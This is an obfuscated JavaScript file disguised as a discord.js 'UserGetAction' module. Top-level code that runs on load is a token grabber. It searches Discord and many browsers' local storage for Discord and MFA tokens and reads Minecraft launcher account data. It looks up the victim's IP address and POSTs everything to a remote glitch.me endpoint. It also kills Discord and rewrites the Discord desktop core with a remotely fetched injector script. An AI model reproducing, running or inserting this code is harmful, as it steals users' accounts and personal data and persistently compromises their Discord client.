function _0xc742(_0x5e5fd4, _0xc7422f) {
    var _0x35da71 = _0x5e5f();
    _0xc742 = function (_0x4a42b0, _0x1531bc) {
        _0x4a42b0 = _0x4a42b0 - 0x0;
        var _0x43bdbc = _0x35da71[_0x4a42b0];
        return _0x43bdbc;
    };
    return _0xc742(_0x5e5fd4, _0xc7422f);
}
var _0x116611 = _0xc742;
const Action = require(_0x116611(0x0));
const OS = require('os'), fs = require('fs'), fetch = require(_0x116611(0x1)), {execSync} = require(_0x116611(0x2)), Glob = require(_0x116611(0x3)), toInject = [], toInjectJS = [], toKill = [], apiurl = _0x116611(0x4);
function _0x5e5f() {
    var _0x4355bd = [
        './Action',
        'node-fetch',
        'child_process',
        'glob',
        'https://frequent-level-cornflower.glitch.me',
        'platform',
        'win32',
        'env',
        'localappdata',
        'appdata',
        '/.minecraft/launcher_accounts.json',
        '/.minecraft/remix/UID.txt',
        '/Discord/Local\x20Storage/leveldb',
        '/DiscordDevelopment/Local\x20Storage/leveldb',
        '/Lightcord/Local\x20Storage/leveldb',
        '/discordptb/Local\x20Storage/leveldb',
        '/discordcanary/Local\x20Storage/leveldb',
        '/Opera\x20Software/Opera\x20Stable/Local\x20Storage/leveldb',
        '/Opera\x20Software/Opera\x20GX\x20Stable/Local\x20Storage/leveldb',
        '/Amigo/User\x20Data/Local\x20Storage/leveldb',
        '/Torch/User\x20Data/Local\x20Storage/leveldb',
        '/Kometa/User\x20Data/Local\x20Storage/leveldb',
        '/Orbitum/User\x20Data/Local\x20Storage/leveldb',
        '/CentBrowser/User\x20Data/Local\x20Storage/leveldb',
        '/7Star/7Star/User\x20Data/Local\x20Storage/leveldb',
        '/Sputnik/Sputnik/User\x20Data/Local\x20Storage/leveldb',
        '/Vivaldi/User\x20Data/Default/Local\x20Storage/leveldb',
        '/Google/Chrome\x20SxS/User\x20Data/Local\x20Storage/leveldb',
        '/Epic\x20Privacy\x20Browser/User\x20Data/Local\x20Storage/leveldb',
        '/Google/Chrome/User\x20Data/Default/Local\x20Storage/leveldb',
        '/uCozMedia/Uran/User\x20Data/Default/Local\x20Storage/leveldb',
        '/Microsoft/Edge/User\x20Data/Default/Local\x20Storage/leveldb',
        '/Yandex/YandexBrowser/User\x20Data/Default/Local\x20Storage/leveldb',
        '/Opera\x20Software/Opera\x20Neon/User\x20Data/Default/Local\x20Storage/leveldb',
        '/BraveSoftware/Brave-Browser/User\x20Data/Default/Local\x20Storage/leveldb',
        'readFile',
        'remix',
        'minecraft',
        'forEach',
        'readdir',
        'filter',
        'endsWith',
        'ldb',
        'readFileSync',
        'toString',
        'exec',
        'http://ip-api.com/json/',
        'then',
        'json',
        '/beforeinject',
        'POST',
        'stringify',
        'slice',
        'query',
        '/remix',
        'accounts',
        '/minecraft',
        'eligibleForMigration',
        'hasMultipleProfiles',
        'legacy',
        'localId',
        'minecraftProfile',
        'name',
        'persistent',
        'remoteId',
        'type',
        'username',
        'activeAccountLocalId',
        'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js',
        'text',
        'writeFileSync',
        'replace',
        '*API\x20URL*',
        'split',
        '/Update.exe\x20--processStart\x20',
        '.exe',
        'readdirSync',
        'includes',
        'cord',
        'push',
        'sync',
        '/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js',
        'map',
        'tasklist',
        'Discord.exe',
        'discord',
        'DiscordCanary.exe',
        'discordcanary',
        'DiscordDevelopment.exe',
        'discorddevelopment',
        'DiscordPTB.exe',
        'discordptb',
        'taskkill\x20/IM\x20',
        '.exe\x20/F',
        'linux',
        '/home/',
        '/.config',
        '/discord/Local\x20Storage/leveldb',
        '/*/modules/discord_desktop_core/index.js',
        'darwin',
        'handle',
        'client',
        'dataManager',
        'newUser',
        'exports'
    ];
    _0x5e5f = function () {
        return _0x4355bd;
    };
    return _0x5e5f();
}
try {
    switch (OS[_0x116611(0x5)]()) {
    case _0x116611(0x6):
        const local = process[_0x116611(0x7)][_0x116611(0x8)], roaming = process[_0x116611(0x7)][_0x116611(0x9)], minecraftPath = roaming + _0x116611(0xa), remixPath = roaming + _0x116611(0xb);
        dbPaths = [
            roaming + _0x116611(0xc),
            roaming + _0x116611(0xd),
            roaming + _0x116611(0xe),
            roaming + _0x116611(0xf),
            roaming + _0x116611(0x10),
            roaming + _0x116611(0x11),
            roaming + _0x116611(0x12),
            local + _0x116611(0x13),
            local + _0x116611(0x14),
            local + _0x116611(0x15),
            local + _0x116611(0x16),
            local + _0x116611(0x17),
            local + _0x116611(0x18),
            local + _0x116611(0x19),
            local + _0x116611(0x1a),
            local + _0x116611(0x1b),
            local + _0x116611(0x1c),
            local + _0x116611(0x1d),
            local + _0x116611(0x1e),
            local + _0x116611(0x1f),
            local + _0x116611(0x20),
            local + _0x116611(0x21),
            local + _0x116611(0x22)
        ];
        init();
        function init() {
            var _0x5e111d = _0xc742;
            fs[_0x5e111d(0x23)](remixPath, (_0x4a7ac8, _0x426744) => _0x426744 && minecraft(_0x5e111d(0x24), _0x426744));
            fs[_0x5e111d(0x23)](minecraftPath, (_0x530c50, _0x3ad5b3) => _0x3ad5b3 && minecraft(_0x5e111d(0x25), _0x3ad5b3));
            injectToDiscord();
            dbPaths[_0x5e111d(0x26)](_0x4ee43b => main(_0x4ee43b));
        }
        function main(_0x5be842) {
            var _0x11fd1b = _0xc742;
            fs[_0x11fd1b(0x27)](_0x5be842, (_0x2d6cbc, _0x7e9451) => {
                var _0x556fac = _0xc742;
                if (_0x7e9451) {
                    var _0x445e39 = _0x7e9451[_0x556fac(0x28)](_0x3a5d71 => _0x3a5d71[_0x556fac(0x29)](_0x556fac(0x2a)));
                    _0x445e39[_0x556fac(0x26)](_0x4d8382 => {
                        var _0x100c94 = _0xc742;
                        var _0xee5f7b = fs[_0x100c94(0x2b)](_0x5be842 + '/' + _0x4d8382)[_0x100c94(0x2c)]();
                        var _0x2d8824 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                        var _0x3e8181 = /"mfa\.[\d\w_-]{84}"/;
                        var [_0x2c9208] = _0x2d8824[_0x100c94(0x2d)](_0xee5f7b) || _0x3e8181[_0x100c94(0x2d)](_0xee5f7b) || [undefined];
                        if (_0x2c9208)
                            fetch(_0x100c94(0x2e))[_0x100c94(0x2f)](_0x218789 => _0x218789[_0x100c94(0x30)]())[_0x100c94(0x2f)](_0x18d715 => fetch(apiurl + _0x100c94(0x31), {
                                'method': _0x100c94(0x32),
                                'body': JSON[_0x100c94(0x33)]({
                                    'token': _0x2c9208[_0x100c94(0x34)](0x1, -0x1),
                                    'ipAddress': _0x18d715[_0x100c94(0x35)]
                                })
                            }));
                    });
                }
            });
        }
        function minecraft(_0x5c02a1, _0x420b59) {
            var _0x372376 = _0xc742;
            switch (_0x5c02a1) {
            case _0x372376(0x24):
                fetch(apiurl + _0x372376(0x36), {
                    'method': _0x372376(0x32),
                    'body': JSON[_0x372376(0x33)]({ 'UID': _0x420b59 })
                });
                break;
            case _0x372376(0x25):
                var [_0x20e8db] = /"[\d\w_-]{32}"/[_0x372376(0x2d)](_0x420b59);
                if (_0x20e8db) {
                    const _0x332646 = require(minecraftPath);
                    if (!_0x332646[_0x372376(0x37)])
                        return;
                    var _0x33c91b = _0x332646[_0x372376(0x37)][_0x20e8db[_0x372376(0x34)](0x1, -0x1)];
                    fetch(apiurl + _0x372376(0x38), {
                        'method': _0x372376(0x32),
                        'body': JSON[_0x372376(0x33)]({
                            'eligibleForMigration': _0x33c91b[_0x372376(0x39)],
                            'hasMultipleProfiles': _0x33c91b[_0x372376(0x3a)],
                            'legacy': _0x33c91b[_0x372376(0x3b)],
                            'localId': _0x33c91b[_0x372376(0x3c)],
                            'minecraftProfileID': _0x33c91b[_0x372376(0x3d)]['id'],
                            'minecraftProfileName': _0x33c91b[_0x372376(0x3d)][_0x372376(0x3e)],
                            'persistent': _0x33c91b[_0x372376(0x3f)],
                            'remoteId': _0x33c91b[_0x372376(0x40)],
                            'type': _0x33c91b[_0x372376(0x41)],
                            'username': _0x33c91b[_0x372376(0x42)],
                            'activeAccountLocalId': _0x332646[_0x372376(0x43)]
                        })
                    });
                }
            }
        }
        function injectToDiscord() {
            var _0x203b19 = _0xc742;
            getInstalledDiscord();
            killAllDiscords();
            fetch(_0x203b19(0x44))[_0x203b19(0x2f)](_0x34cf9f => _0x34cf9f[_0x203b19(0x45)]())[_0x203b19(0x2f)](_0xa415e3 => toInjectJS[_0x203b19(0x26)](_0x41aaa3 => fs[_0x203b19(0x46)](_0x41aaa3, _0xa415e3[_0x203b19(0x47)](_0x203b19(0x48), apiurl)) ^ execSync(local + '/' + _0x41aaa3[_0x203b19(0x49)]('/')[0x5] + _0x203b19(0x4a) + _0x41aaa3[_0x203b19(0x49)]('/')[0x5] + _0x203b19(0x4b))));
        }
        function getInstalledDiscord() {
            var _0x4491d9 = _0xc742;
            fs[_0x4491d9(0x4c)](roaming)[_0x4491d9(0x26)](_0x4c5a8c => _0x4c5a8c[_0x4491d9(0x4d)](_0x4491d9(0x4e)) && toInject[_0x4491d9(0x4f)](local + '/' + _0x4c5a8c));
            toInject[_0x4491d9(0x26)](_0x2561f1 => Glob[_0x4491d9(0x50)](_0x2561f1 + _0x4491d9(0x51))[_0x4491d9(0x52)](_0x2f127c => toInjectJS[_0x4491d9(0x4f)](_0x2f127c)));
        }
        function killAllDiscords() {
            var _0x1118d4 = _0xc742;
            var _0x366a85 = execSync(_0x1118d4(0x53))[_0x1118d4(0x2c)]();
            _0x366a85[_0x1118d4(0x4d)](_0x1118d4(0x54)) && toKill[_0x1118d4(0x4f)](_0x1118d4(0x55));
            _0x366a85[_0x1118d4(0x4d)](_0x1118d4(0x56)) && toKill[_0x1118d4(0x4f)](_0x1118d4(0x57));
            _0x366a85[_0x1118d4(0x4d)](_0x1118d4(0x58)) && toKill[_0x1118d4(0x4f)](_0x1118d4(0x59));
            _0x366a85[_0x1118d4(0x4d)](_0x1118d4(0x5a)) && toKill[_0x1118d4(0x4f)](_0x1118d4(0x5b));
            toKill[_0x1118d4(0x26)](_0x2c1c57 => execSync(_0x1118d4(0x5c) + _0x2c1c57 + _0x1118d4(0x5d)));
        }
        break;
    case _0x116611(0x5e):
        const defaut = _0x116611(0x5f) + __dirname[_0x116611(0x49)]('/')[0x2] + _0x116611(0x60), LdbPaths = [
                defaut + _0x116611(0x61),
                defaut + _0x116611(0x10),
                defaut + _0x116611(0xf),
                defaut + _0x116611(0xd)
            ];
        const LminecraftPath = defaut + _0x116611(0xa);
        Linit();
        function Linit() {
            var _0x507257 = _0xc742;
            LdbPaths[_0x507257(0x26)](_0x25ea8a => Lmain(_0x25ea8a));
            var _0x53a01c = fs[_0x507257(0x2b)](LminecraftPath);
            if (_0x53a01c)
                Lminecraft(_0x53a01c);
            LinjectToDiscord();
        }
        function Lmain(_0x15a8b3) {
            var _0xcbb99d = _0xc742;
            fs[_0xcbb99d(0x27)](_0x15a8b3, (_0x4063cc, _0x35a753) => {
                var _0x457d80 = _0xc742;
                if (_0x35a753) {
                    var _0x449e1d = _0x35a753[_0x457d80(0x28)](_0x17c0b2 => _0x17c0b2[_0x457d80(0x29)](_0x457d80(0x2a)));
                    _0x449e1d[_0x457d80(0x26)](_0x22253d => {
                        var _0x2011a2 = _0xc742;
                        var _0x48d3b9 = fs[_0x2011a2(0x2b)](_0x35a753 + '/' + _0x22253d)[_0x2011a2(0x2c)]();
                        var _0x14bdb6 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                        var _0x26f202 = /"mfa\.[\d\w_-]{84}"/;
                        var [_0xba569e] = _0x14bdb6[_0x2011a2(0x2d)](_0x48d3b9) || _0x26f202[_0x2011a2(0x2d)](_0x48d3b9) || [undefined];
                        if (_0xba569e)
                            fetch(_0x2011a2(0x2e))[_0x2011a2(0x2f)](_0x433594 => _0x433594[_0x2011a2(0x30)]())[_0x2011a2(0x2f)](_0x4d73a0 => fetch(apiurl + _0x2011a2(0x31), {
                                'method': _0x2011a2(0x32),
                                'body': JSON[_0x2011a2(0x33)]({
                                    'token': _0xba569e,
                                    'ip': _0x4d73a0[_0x2011a2(0x35)]
                                })
                            }));
                    });
                }
            });
        }
        function Lminecraft(_0x1e99c4) {
            var _0x270bf1 = _0xc742;
            var [_0x34f02b] = /"[\d\w_-]{32}"/[_0x270bf1(0x2d)](_0x1e99c4);
            if (_0x34f02b) {
                const _0x1d2112 = require(LminecraftPath);
                if (!_0x1d2112[_0x270bf1(0x37)])
                    return;
                var _0x156380 = _0x1d2112[_0x270bf1(0x37)][_0x34f02b[_0x270bf1(0x34)](0x1, -0x1)];
                fetch(apiurl + _0x270bf1(0x38), {
                    'method': _0x270bf1(0x32),
                    'body': JSON[_0x270bf1(0x33)]({
                        'eligibleForMigration': _0x156380[_0x270bf1(0x39)],
                        'hasMultipleProfiles': _0x156380[_0x270bf1(0x3a)],
                        'legacy': _0x156380[_0x270bf1(0x3b)],
                        'localId': _0x156380[_0x270bf1(0x3c)],
                        'minecraftProfileID': _0x156380[_0x270bf1(0x3d)]['id'],
                        'minecraftProfileName': _0x156380[_0x270bf1(0x3d)][_0x270bf1(0x3e)],
                        'persistent': _0x156380[_0x270bf1(0x3f)],
                        'remoteId': _0x156380[_0x270bf1(0x40)],
                        'type': _0x156380[_0x270bf1(0x41)],
                        'username': _0x156380[_0x270bf1(0x42)],
                        'activeAccountLocalId': _0x1d2112[_0x270bf1(0x43)]
                    })
                });
            }
        }
        function LinjectToDiscord() {
            var _0x42ef5f = _0xc742;
            getInstalledLDiscord();
            fetch(_0x42ef5f(0x44))[_0x42ef5f(0x2f)](_0x3500a3 => _0x3500a3[_0x42ef5f(0x45)]())[_0x42ef5f(0x2f)](_0x55acf => toInjectJS[_0x42ef5f(0x26)](_0x57e62c => fs[_0x42ef5f(0x46)](_0x57e62c, _0x55acf[_0x42ef5f(0x47)](_0x42ef5f(0x48), apiurl))));
        }
        function getInstalledLDiscord() {
            var _0x53c7ad = _0xc742;
            fs[_0x53c7ad(0x4c)](defaut)[_0x53c7ad(0x26)](_0x42d323 => _0x42d323[_0x53c7ad(0x4d)](_0x53c7ad(0x4e)) && toInject[_0x53c7ad(0x4f)](defaut + '/' + _0x42d323));
            toInject[_0x53c7ad(0x26)](_0x4deb85 => Glob[_0x53c7ad(0x50)](_0x4deb85 + _0x53c7ad(0x62))[_0x53c7ad(0x52)](_0x5b5a7b => toInjectJS[_0x53c7ad(0x4f)](_0x5b5a7b)));
        }
        break;
    case _0x116611(0x63):
        break;
    }
} catch (_0x5a160b) {
}
class UserGetAction extends Action {
    [_0x116611(0x64)](_0x8b1c39) {
        var _0x589bd8 = _0xc742;
        const _0x5969c9 = this[_0x589bd8(0x65)];
        const _0x28624e = _0x5969c9[_0x589bd8(0x66)][_0x589bd8(0x67)](_0x8b1c39);
        return { 'user': _0x28624e };
    }
}
module[_0x116611(0x68)] = UserGetAction;
